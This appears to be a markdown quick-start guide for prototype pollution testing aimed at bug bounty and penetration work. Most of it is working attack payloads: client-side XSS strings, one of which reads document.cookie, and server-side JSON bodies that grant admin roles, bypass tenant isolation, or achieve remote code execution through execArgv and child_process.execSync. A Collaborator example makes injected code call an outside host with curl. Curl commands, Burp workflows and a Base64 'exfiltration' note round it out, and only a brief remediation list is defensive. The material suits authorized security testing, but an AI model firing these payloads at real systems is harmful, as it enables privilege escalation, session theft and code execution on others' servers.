# Prototype Pollution Quick Start Guide

## 60-Second Vulnerability Check

### Client-Side Quick Test
```javascript
// 1. Add to URL
?__proto__[test]=vulnerable

// 2. Open Console (F12)
Object.prototype

// 3. Look for "test: vulnerable"
// If present = VULNERABLE
```

### Server-Side Quick Test
```bash
curl -X POST https://target.com/api/endpoint \
  -H "Content-Type: application/json" \
  -d '{"__proto__": {"json spaces": 10}}'

# Check response for increased indentation = VULNERABLE
```

---

## Common Exploitation Payloads

### Client-Side XSS

```javascript
// Basic detection
?__proto__[test]=vulnerable

// XSS via transport_url gadget
?__proto__[transport_url]=data:,alert(1);

// XSS via value property (Browser API bypass)
?__proto__[value]=data:,alert(document.domain);

// Sanitization bypass
?__pro__proto__to__[transport_url]=data:,alert(1);

// Hash-based exploitation
#__proto__[hitCallback]=alert(document.cookie)

// Constructor alternative
?constructor[prototype][transport_url]=data:,alert(1);
```

### Server-Side Privilege Escalation

```json
// Detection
{
    "data": "test",
    "__proto__": {
        "foo": "bar"
    }
}

// Privilege escalation
{
    "data": "test",
    "__proto__": {
        "isAdmin": true
    }
}

// Role manipulation
{
    "data": "test",
    "__proto__": {
        "role": "admin",
        "privilegeLevel": 999
    }
}
```

### Server-Side RCE

```json
// Non-destructive detection (JSON spaces)
{
    "data": "test",
    "__proto__": {
        "json spaces": 10
    }
}

// RCE via execArgv (most common)
{
    "data": "test",
    "__proto__": {
        "execArgv": [
            "--eval=require('child_process').execSync('COMMAND')"
        ]
    }
}

// RCE via vim shell
{
    "data": "test",
    "__proto__": {
        "shell": "vim",
        "input": ":! COMMAND\n"
    }
}

// Status code detection
{
    "data": "test",
    "__proto__": {
        "status": 555
    }
}
```

---

## Burp Suite Speed Tips

### Essential Shortcuts

| Action | Shortcut |
|--------|----------|
| Send to Repeater | `Ctrl+R` |
| Send to Intruder | `Ctrl+I` |
| Open DOM Invader | `Ctrl+Shift+I` |
| Scan for gadgets | `Ctrl+Shift+G` |
| Open Collaborator | `Ctrl+Shift+C` |
| Pretty print JSON | `Ctrl+Shift+B` |
| Go to tab | `Ctrl+1-9` |

### DOM Invader Workflow

1. **Setup (30 seconds):**
   - Burp → Built-in browser
   - DOM Invader → Settings
   - Enable "Prototype pollution"
   - Check "Scan for gadgets automatically"

2. **Testing (1 minute):**
   - Navigate to target
   - DOM Invader auto-detects sources
   - Click "Scan for gadgets"
   - Select exploit → Click "Exploit"

3. **Benefits:**
   - Automatic source detection
   - Gadget chain identification
   - One-click exploitation
   - Works with minified code

### Repeater Workflow for Server-Side

1. **Find vulnerable endpoint:**
   - Proxy → HTTP history
   - Look for JSON POST requests
   - Send to Repeater (`Ctrl+R`)

2. **Test pollution (2 minutes):**
   ```json
   {
       "legitimate": "data",
       "__proto__": {
           "json spaces": 10
       }
   }
   ```
   - Send (`Ctrl+Space` or click)
   - Check Raw response for indentation

3. **Identify gadgets (5 minutes):**
   - Look for boolean properties: `isAdmin`, `isAuthenticated`
   - Look for role/privilege properties
   - Test property reflection

4. **Exploit:**
   - Modify `__proto__` object
   - Send payload
   - Verify in browser

### Collaborator Workflow

1. **Setup:**
   - Burp menu → Burp Collaborator client
   - Click "Copy to clipboard"

2. **Usage in payloads:**
   ```json
   "__proto__": {
       "execArgv": ["--eval=require('child_process').execSync('curl https://YOUR-ID.oastify.com')"]
   }
   ```

3. **Check results:**
   - Collaborator client → "Poll now"
   - Look for DNS/HTTP interactions

---

## Testing Methodology Checklist

### Client-Side Testing (5 minutes)

- [ ] **Test query string:** `?__proto__[test]=value`
- [ ] **Test hash:** `#__proto__[test]=value`
- [ ] **Check console:** `Object.prototype`
- [ ] **Test constructor:** `?constructor[prototype][test]=value`
- [ ] **Use DOM Invader** for automatic detection
- [ ] **Scan for gadgets** with DOM Invader
- [ ] **Test exploit** with `data:,alert(1);`

### Server-Side Testing (10 minutes)

- [ ] **Identify JSON endpoints** in Proxy history
- [ ] **Test JSON spaces:** `"__proto__": {"json spaces": 10}`
- [ ] **Test status code:** `"__proto__": {"status": 555}`
- [ ] **Test property reflection:** `"__proto__": {"test": "value"}`
- [ ] **Check responses** for reflected properties
- [ ] **Look for boolean properties** (isAdmin, isAuth, etc.)
- [ ] **Test privilege escalation** by polling identified properties
- [ ] **Setup Collaborator** for RCE testing
- [ ] **Test RCE** with safe commands first (curl to Collaborator)
- [ ] **Identify gadget triggers** (admin actions, cron jobs, etc.)

---

## Detection Commands

### Client-Side (Browser Console)

```javascript
// Quick detection
Object.prototype

// Programmatic check
(function() {
    const test = '__pptest_' + Math.random();
    window.location.search = '?__proto__[' + test + ']=1';
    setTimeout(() => {
        console.log(Object.prototype[test] ? 'VULNERABLE' : 'SAFE');
    }, 100);
})();
```

### Server-Side (cURL)

```bash
# JSON Spaces Detection
curl -X POST https://target.com/api/endpoint \
  -H "Content-Type: application/json" \
  -d '{
    "data": "test",
    "__proto__": {
      "json spaces": 10
    }
  }' | grep -c "    "

# If count > 5, likely vulnerable

# Status Code Detection
curl -X POST https://target.com/api/endpoint \
  -H "Content-Type: application/json" \
  -w "\n%{http_code}\n" \
  -d '{
    "__proto__": {
      "status": 555
    }
  }'

# If status = 555, vulnerable

# Property Reflection
curl -X POST https://target.com/api/endpoint \
  -H "Content-Type: application/json" \
  -d '{
    "__proto__": {
      "pptest": "vulnerable"
    }
  }' | jq '.pptest'

# If output = "vulnerable", vulnerable
```

---

## Payload Encoding Reference

### URL Encoding

```
# Required for URL parameters
__proto__[test]=value
→ __proto__%5Btest%5D=value

# Data URL (already encoded)
data:,alert(1);
→ data:,alert(1);  # No encoding needed in URL params

# Special characters
< → %3C
> → %3E
" → %22
' → %27
( → %28
) → %29
```

### JSON Encoding

```json
// Correct JSON (no encoding needed)
{
    "__proto__": {
        "test": "value"
    }
}

// Escaping in JSON strings
{
    "__proto__": {
        "script": "<img src=x onerror=alert(1)>"
    }
}
```

### Base64 (for data exfiltration)

```bash
# Encode
echo "secret content" | base64
# Output: c2VjcmV0IGNvbnRlbnQK

# Decode
echo "c2VjcmV0IGNvbnRlbnQK" | base64 -d
# Output: secret content
```

---

## Quick Wins by Application Type

### E-Commerce / Account Systems
**Target:** `isAdmin`, `isPremium`, `discountRate`
```json
"__proto__": {
    "isAdmin": true,
    "isPremium": true,
    "discountRate": 1.0
}
```

### SaaS / Multi-Tenant
**Target:** `tenantId`, `organizationId`, `accessLevel`
```json
"__proto__": {
    "tenantId": "victim-tenant",
    "bypassIsolation": true
}
```

### API Gateways
**Target:** `rateLimit`, `authenticated`, `apiKey`
```json
"__proto__": {
    "authenticated": true,
    "rateLimit": false,
    "apiKey": "valid-key"
}
```

### CMS / Content Platforms
**Target:** `canEdit`, `canPublish`, `role`
```json
"__proto__": {
    "canEdit": true,
    "canPublish": true,
    "role": "editor"
}
```

---

## Bug Bounty 5-Minute Workflow

**Quick Recon (2 minutes):**
1. Identify JSON endpoints
2. Check query string parsing
3. Look for client-side JS that merges objects

**Test Detection (1 minute):**
```bash
# Client-side
curl "https://target.com/?__proto__[test]=1"
# Check console

# Server-side
curl -X POST https://target.com/api/endpoint \
  -H "Content-Type: application/json" \
  -d '{"__proto__": {"json spaces": 10}}'
```

**Identify Impact (2 minutes):**
- Can you escalate privileges?
- Can you achieve XSS?
- Can you trigger RCE?
- What gadgets exist?

**Report Template:**
```markdown
## Prototype Pollution in [Endpoint]

**Severity:** High/Critical
**Type:** [Client-Side XSS / Server-Side RCE / Privilege Escalation]

### Proof of Concept

[Payload and steps]

### Impact

[Specific exploitation scenario]

### Remediation

- Sanitize property keys
- Use Object.create(null)
- Implement input validation
```

---

**Last Updated:** 2026-01-10
**Version:** 1.0 - Quick Start Edition

> **Full payload reference, gadget chains, bypass techniques, and prevention code:** See [prototype-pollution-cheat-sheet.md](./prototype-pollution-cheat-sheet.md)
